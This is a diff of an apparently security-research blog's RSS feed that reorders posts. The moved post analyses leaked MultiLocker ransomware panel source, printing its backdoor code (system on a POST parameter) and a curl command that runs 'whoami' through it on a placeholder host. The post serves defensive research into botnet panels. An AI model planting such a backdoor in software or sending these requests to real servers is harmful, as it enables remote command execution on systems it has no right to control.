@@ -345,34 +345,6 @@ houseofcarders.com
     </item>
     
     <item>
-      <title>MultiLocker Backdoor</title>
-      <link>https://bwall.github.io/multilocker-backdoor/</link>
-      <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
-      
-      <guid>https://bwall.github.io/multilocker-backdoor/</guid>
-      <description>&lt;p&gt;In a recent search through some underground communities, I came across the source code to a version of the MultiLocker panel.  With ransomware, the security industry is always looking for a good way to resolve the issue without the ransom being paid.  This could potentially be done by gathering information from the botnet&amp;rsquo;s panel.&lt;/p&gt;
-
-&lt;!-- more --&gt;
-
-&lt;p&gt;While there are likely other vulnerabilities, this one stood out after a quick grep of the code.  In the &amp;lsquo;lending/PL.php&amp;rsquo;, there is some obvious backdoor code.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;if (!empty($_POST[&#39;c&#39;]))
-{
-system($_POST[&#39;c&#39;]);
-die();
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This can easily be accessed with curl or wget (let&amp;rsquo;s assume &lt;a href=&#34;http://c2.panel/&#34;&gt;http://c2.panel/&lt;/a&gt; is the MultiLocker panel root).&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;curl -v -d &amp;quot;c=whoami&amp;quot; http://c2.panel/lending/PL.php
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;For more information on MultiLocker, you can check out a great blog post on it &lt;a href=&#34;http://www.xylibox.com/2012/11/multi-locker.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
       <title>Herpes Net 3.0 SQLi</title>
       <link>https://bwall.github.io/herpes-net-3.0-sqli/</link>
       <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
@@ -422,6 +394,34 @@ die();
 &lt;p&gt;The data returned will be followed by &amp;lsquo;|4&amp;rsquo; as that is what is being returned in the &amp;lsquo;variable&amp;rsquo; row.  We can of course control this value as well if needed.&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://github.com/bwall/BAMF/blob/master/IntegrationQueue/http/herpesnet/herpesnet.class.py&#34;&gt;Here&lt;/a&gt; is a proof of concept which uses this second order SQL injection to extract the bot information from the database.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>MultiLocker Backdoor</title>
+      <link>https://bwall.github.io/multilocker-backdoor/</link>
+      <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
+      
+      <guid>https://bwall.github.io/multilocker-backdoor/</guid>
+      <description>&lt;p&gt;In a recent search through some underground communities, I came across the source code to a version of the MultiLocker panel.  With ransomware, the security industry is always looking for a good way to resolve the issue without the ransom being paid.  This could potentially be done by gathering information from the botnet&amp;rsquo;s panel.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;While there are likely other vulnerabilities, this one stood out after a quick grep of the code.  In the &amp;lsquo;lending/PL.php&amp;rsquo;, there is some obvious backdoor code.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;if (!empty($_POST[&#39;c&#39;]))
+{
+system($_POST[&#39;c&#39;]);
+die();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This can easily be accessed with curl or wget (let&amp;rsquo;s assume &lt;a href=&#34;http://c2.panel/&#34;&gt;http://c2.panel/&lt;/a&gt; is the MultiLocker panel root).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;curl -v -d &amp;quot;c=whoami&amp;quot; http://c2.panel/lending/PL.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For more information on MultiLocker, you can check out a great blog post on it &lt;a href=&#34;http://www.xylibox.com/2012/11/multi-locker.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
 </description>
     </item>
     
